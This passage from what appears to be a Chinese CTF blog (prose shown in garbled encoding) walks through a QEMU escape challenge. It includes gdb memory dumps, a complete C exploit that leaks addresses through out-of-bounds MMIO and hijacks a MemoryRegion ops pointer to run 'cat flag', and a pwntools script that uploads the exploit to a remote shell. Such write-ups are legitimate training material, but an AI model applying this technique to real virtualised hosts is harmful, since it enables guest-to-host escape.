ä¸€ä¸‹ï¼Œæœ€ç»ˆå‘ç°è¿™å‡ ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„åœ°æ–¹</p>
<blockquote>
<p>PIE</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da256a335b</span></span><br><span class="line"><span class="number">0x55da256a335b</span> &lt;memory_region_destructor_none&gt;: <span class="number">0xe5894855fa1e0ff3</span>      <span class="number">0xf3c35d90f87d8948</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬åœ¨ IDA ä¸­æ˜¯èƒ½æœåˆ°è¿™ä¸ªå‡½æ•°çš„ï¼Œå®ƒåœ¨ QEMU é‡Œçš„åç§»é‡æ˜¯
0x82B35Bï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡º docker åŠ è½½ QEMU æ—¶çš„åŸºåœ°å€äº†</p>
<blockquote>
<p>heap &amp; MemoryRegion</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da25dd01e0</span> &lt;vn_mmio_ops&gt;:   <span class="number">0x000055da252d3458</span>      <span class="number">0x000055da252d3502</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬æ‰¾åˆ°äº†éœ€è¦çš„ opsï¼Œtest24 å­˜çš„å°±æ˜¯ 0x55da25dd01e0</p>
<p>æ‰€ä»¥æˆ‘ä»¬æœ‰å¦‚ä¸‹å¯¹åº”å…³ç³»ï¼š <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ptr[<span class="number">-24</span> + <span class="number">720</span>] -&gt; <span class="number">0x55da25dd01e0</span></span><br></pre></td></tr></table></figure></p>
<p>é‚£å¾ˆè‡ªç„¶çš„æˆ‘ä»¬å°±æƒ³åˆ°ï¼Œptrçš„å…¶ä»–åœ°æ–¹å­˜ç€ä»€ä¹ˆï¼Ÿè¿™é™„è¿‘æ˜¯ä¸æ˜¯å°±æ˜¯
MemoryRegionï¼Ÿå¯æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰ (&amp;ptr[-24 + 720])ï¼Œä½†æˆ‘ä»¬çŸ¥é“çš„æ˜¯
MemoryRegion å­˜åœ¨å †é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨ find
å‘½ä»¤æŸ¥æ‰¾ï¼ˆçœ‹èµ·æ¥åƒå †åœ°å€çš„ï¼‰å †åœ°å€é™„è¿‘æŸ¥æ‰¾ 0x55da25dd01e0 è¿™ä¸ªå€¼å°±è¡Œ</p>
<p>æœ€ç»ˆæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ test23 -&gt; 0x55da2812e470</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŸ¥æ‰¾ [0x55da2812e470,0x55da2812e470+0x1000] ä¸­å­˜æ”¾0x55da25dd01e0çš„åœ°å€</span></span><br><span class="line">(gdb) find <span class="number">0x55da2812e470</span>, <span class="number">0x55da2812e470</span>+<span class="number">0x1000</span>, <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da2812eef0</span></span><br><span class="line"><span class="number">1</span> pattern found.</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æˆ‘ä»¬çŸ¥é“ 0x55da2812eef0 å­˜æ”¾ç€æˆ‘ä»¬éœ€è¦çš„ 0x55da25dd01e0</p>
<p>è§‚å¯Ÿå‘ç°è¿™ä¸ªåœ°å€è·Ÿæˆ‘ä»¬çš„ test10 éå¸¸è¿‘ï¼Œå¯ä»¥è®¡ç®—ä¸€ä¸‹
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) print(<span class="number">0x55da2812ef58</span> - <span class="number">0x55da2812eef0</span>)</span><br><span class="line">$<span class="number">1</span> = <span class="number">104</span></span><br><span class="line"><span class="comment">// 104 = 0x68</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥ test23 = 0x55da2812eef0 =  0x55da2812ef58 - 0x68 = test10 - 0x68</span></span><br></pre></td></tr></table></figure></p>
<p>è€Œæˆ‘ä»¬æ‰“å°ä¸€ä¸‹æ›´å¤šé™„è¿‘çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">52</span>xg <span class="number">0x55da2812ef58</span> - <span class="number">0x58</span> - <span class="number">0x60</span></span><br><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span>      <span class="number">0x000055da2812e470</span> &lt;- test <span class="number">24</span> | <span class="number">23</span></span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span>      <span class="number">0x000055da256a335b</span> &lt;- test <span class="number">18</span> | <span class="number">17</span></span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x000055da2812ef58</span>      <span class="number">0x000055da27e4f820</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x000055da271feb98</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x000055da2812ef78</span>      <span class="number">0x000055da28130f00</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span> &lt;- test <span class="number">0</span> | <span class="number">-1</span></span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eff0</span>: <span class="number">0x00000000ffffff2c</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812f000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x55da2812f010</span>: <span class="number">0x000055da2812d3c0</span>      <span class="number">0x000055da273b01d0</span></span><br><span class="line"><span class="number">0x55da2812f020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725d5f</span></span><br><span class="line"><span class="number">0x55da2812f030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725de1</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å›åˆ° <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">ctf-wiki-QEMU</a>
é‡ŒæŸ¥çœ‹ä¸€ä¸‹ MemoryRegion</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// æŒ‡å‘çˆ¶ MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// å†…å­˜åŒºåŸŸå¤§å°</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// åœ¨çˆ¶ MR ä¸­çš„åç§»é‡</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// ä»…åœ¨ alias MR ä¸­ï¼ŒæŒ‡å‘å®é™…çš„ MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å‡è®¾æˆ‘ä»¬æŠŠ test24 çœ‹ä½œä¸Šé¢ç»“æ„ä½“çš„ const MemoryRegionOps *ops;
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span></span><br><span class="line"><span class="number">0x55da2812eea8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span></span><br><span class="line"><span class="number">0x55da2812eeb8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eec8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eed8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eee8</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span> <span class="number">-24</span> -&gt; test24 -&gt; ops</span><br><span class="line"><span class="number">0x55da2812eef8</span>: <span class="number">0x000055da2812e470</span> <span class="number">-23</span> -&gt; test23 -&gt; opaque</span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span> <span class="number">-22</span> -&gt; test22 -&gt; container</span><br><span class="line"><span class="number">0x55da2812ef08</span>: <span class="number">0x0000000000000000</span> <span class="number">-21</span> -&gt; test21 -&gt; è¿™é‡Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆğŸ˜­</span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span> <span class="number">-20</span> -&gt; test20 -&gt; size(Int128)</span><br><span class="line"><span class="number">0x55da2812ef18</span>: <span class="number">0x0000000000000000</span> <span class="number">-19</span> -&gt; test19 -&gt; size</span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span> <span class="number">-18</span> -&gt; test18 -&gt; addr</span><br><span class="line"><span class="number">0x55da2812ef28</span>: <span class="number">0x000055da256a335b</span> <span class="number">-17</span> -&gt; test17 -&gt; mr</span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef38</span>: <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef48</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812ef58</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef68</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef78</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef88</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef98</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa8</span>: <span class="number">0x0000000000000000</span> -&gt; test0 </span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span> -&gt; å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€å¤§ç‰‡<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="number">0x55da2812efb8</span>: <span class="number">0x0000000000000000</span> -&gt; æˆ‘ä»¬å¯ä»¥æŠŠæ§åˆ¶æµåŠ«æŒçš„æŒ‡é’ˆ</span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span> -&gt; æ”¾åœ¨è¿™ä¸€ç‰‡</span><br><span class="line"><span class="number">0x55da2812efc8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe8</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯ MemoryRegionï¼Œå½“æˆ‘ä»¬ä¿®æ”¹ ptr[-24 + 720] å³
MemoryRegion.ops çš„å€¼ä¸º 0x55da2812efb8(&amp;test0 + 8)ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ‰§è¡Œ
vn_mmio_read å’Œ vn_mmio_write æ—¶å»æ‰§è¡Œ 0x55da2812efb8 æŒ‡å‘çš„å‡½æ•°</p>
<p>æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘è¿™æ ·çš„å¸ƒç½®ï¼š <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eef0</span>(&amp;test24)   -&gt; <span class="number">0x55da2812efd8</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>(&amp;backdoor) -&gt; <span class="number">0x55da2812efd0</span> -&gt; åé—¨å‡½æ•°<span class="number">0x67429B</span></span><br></pre></td></tr></table></figure></p>
<p>å®Œæ•´ exp <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define MAP_SIZE 4096UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_base;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">getMMIOBase</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = open(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_base = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_base == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie = pie_low + (pie_high &lt;&lt; <span class="number">32</span>) - <span class="number">0x82B35B</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pie = 0x%llx\n&quot;</span>, pie);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap = heap_low + (heap_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap = 0x%llx\n&quot;</span>, heap);</span><br><span class="line">    <span class="type">uint64_t</span> backdoor = pie + <span class="number">0x67429B</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_plt_addr = heap + <span class="number">0x60</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">uint64_t</span> cmdaddr = heap + <span class="number">0x58</span> + <span class="number">8</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write_idx(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">12</span>,<span class="number">0x67616C66</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">16</span>,backdoor &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">20</span>,backdoor &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">24</span>,system_plt_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">28</span>,system_plt_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">32</span>,cmdaddr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">36</span>,cmdaddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">40</span>;i &lt;= <span class="number">60</span> ;i += <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mmio_write_idx(i,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">-0xc0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x30</span>,system_plt_addr);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_read(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚ä½•ä¼ åˆ°è¿œç«¯æœåŠ¡å™¨ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x ./exp;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024hgame-wp</title>
    <url>/2024/02/14/comp%20-%202024hgame-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è°é™¤å¤•å’Œæƒ…äººèŠ‚è¿˜åœ¨åŠ ç­å†™ wp å•ŠğŸ˜­2024è¦è„±ç¦» game çº§åˆ«ï¼
</blockquote>
<span id="more"></span>
<h1 id="ç›®å½•">ç›®å½•</h1>
<ul>
<li><a href="#week1">Week 1</a>
<ul>
<li><a href="#pwn">Pwn</a></li>
</ul></li>
<li><a href="#week2">Week 2</a>
<ul>
<li><a href="#pwn---ak">Pwn</a></li>
<li><a href="#rev">Rev</a></li>
</ul></li>
<li><a href="#week3">Week3</a>
<ul>
<li><a href="#pwn---ä¸€è¡€">Pwn</a></li>
</ul></li>
<li><a href="#week4">Week4</a>
<ul>
<li><a href="#pwn-1">Pwn</a></li>
</ul></li>
</ul>
<h1 id="week1">Week1</h1>
<p>week1 åœ¨åšé¡¹ç›®ï¼ŒæŠŠè¿™äº‹ç»™å¿˜äº†ï¼Œåš week2 çš„æ—¶å€™ä¸ºäº†æ‰¾çµæ„Ÿåšäº†ä¸€ä¸‹ week1
çš„ ezshellcode</p>
<h2 id="pwn">Pwn</h2>
<h3 id="ezshellcode">ezshellcode</h3>
